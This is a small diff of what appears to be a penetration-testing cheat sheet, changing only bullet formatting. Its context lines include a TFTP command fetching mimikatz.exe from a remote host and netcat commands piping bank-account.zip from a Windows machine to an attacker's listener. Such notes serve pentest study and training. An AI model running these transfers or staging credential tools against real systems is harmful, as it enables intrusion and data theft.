@@ -46,9 +46,11 @@ Using MSF. Start MSF before starting these steps:
   	4. tftp -i 10.10.10.10 GET mimikatz.exe
 
 #NC (Windows to Kali)
-Windows:
+
+- Windows:
 - C:\> nc -nv 10.11.0.61 4444 < bank-account.zip
-Kali:
+
+- Kali:
 - nc -nlvp 4444 > bank-account.zip
 
 
